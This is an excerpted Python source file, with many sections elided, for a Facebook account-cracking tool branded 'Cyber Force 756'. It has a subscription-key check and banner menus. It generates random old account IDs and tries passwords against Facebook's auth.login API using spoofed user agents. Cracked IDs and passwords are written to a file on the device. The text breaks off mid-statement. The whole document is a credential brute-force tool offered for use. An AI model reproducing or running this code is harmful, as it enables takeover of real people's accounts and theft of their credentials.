...
class SubscriptionManager:
    ...
    def check_online_subscription(self, key):
        try:
            url = f"https://www.mamun.store/clone/check_key.php?key={key}"
    ...
    def display_subscription_info(self):
        ...
        print('\x1b[1;92m[~] WELCOME to Cyber Force 756 🚀✨\x1b[0m')
        print('\x1b[1;96m[~] CREATOR: ERR0R-V4U⚠️\x1b[0m')
        print()
        ...
        print()
        telegram_url = "http://t.me/error_clone_subscription_bot"
...
\x1b[1;95m╚═══════════════════════════════════════════════════════╝
\x1b[1;96m   ➤ \x1b[1;97mCreator        : \x1b[1;96mERR0R-V4U
\x1b[1;96m   ➤ \x1b[1;97mOperated By    : \x1b[1;92mAL NAYEEM
...
print('\x1b[1;92m[~] WELCOME to Cyber Force 756 🚀✨\x1b[0m')
print('\x1b[1;96m[~] CREATOR: ERR0R-V4U⚠️\x1b[0m')
os.system('xdg-open https://t.me/ERR0R_V4U_Your_Love')
time.sleep(2)
...
class UserAgentGenerator:
    ...
    def _generate_mozilla_user_agent(self):
        ...
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}',
                                    '{density=2.5,width=1080,height=2400}'))
    ...
    def _generate_iphone_user_agent(self):
        ...
        resolution = random.choice(('{density=2.0,width=750,height=1334}', '{density=3.0,width=1125,height=2436}',
                                    '{density=3.5,width=1242,height=2688}'))
    ...
    def generate_user_agent(self):
        user_agent_type = random.choice(
            ('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'FacebookOrca', 'FacebookKatana', 'Custom'))
...
try:
    ...
    fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode('utf-8').replace(',',
                                                                                                         ':').replace(
        '\n', '')
    fbdm = ('{density=2.0,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height',
                                                             shell=True).decode('utf-8').replace('\n', '') +
            ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode(
                'utf-8').replace('\n', '') + '}')
except Exception:
    fbcr = 'Zong'
...
class ASIMCracker:
    ...
    def old_menu(self):
        ...
        print(f'{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣')
        print(f'{self.color.P}║ {self.color.C}[1] {self.color.G}CRACK 2005–2006 UID ACCOUNTS 🔓{self.color.P}║')
        ...
        if choice in ('1', '01'):
            ...
            targets = [str(random.randint(1000000, 49999999)) for _ in range(limit)]
    ...
    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(
            f'\r  {self.color.W}[CYBER FORCE 756] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()
    ...
    def try_breach(self, uid, password):
        try:
            ...
            headers = {
                ...
                'Host': 'graph.facebook.com'  # বা 'b-api.facebook.com' / 'beta.facebook.com'
            }
            ...
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/method/auth.login')  # এখানে API URL চাইলে বদলাও
            c.setopt(c.POST, 1)
            ...
            # 🐞 Debug print:
            print(f"[DEBUG] {uid}|{password} -> {response_body}")
            ...
            if 'session_key' in response:
                ...
                # Optional: অন্য error response দেখানো
                if 'error' in response:
                    print(f"[ERROR] {uid}|{password} -> {response['error'].get('message')}")

        except Exception as e:
            print(f"[EXCEPTION] {uid}|{password} -> {str(e)}")
    ...
    def handle_partial(self, uid, password):
        print(
            f'\r  {self.color.Y}\x1b[1;96m   ➤ OK {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.W}')
        with open('/sdcard/ASIM-OLD.txt', 'a') as f:
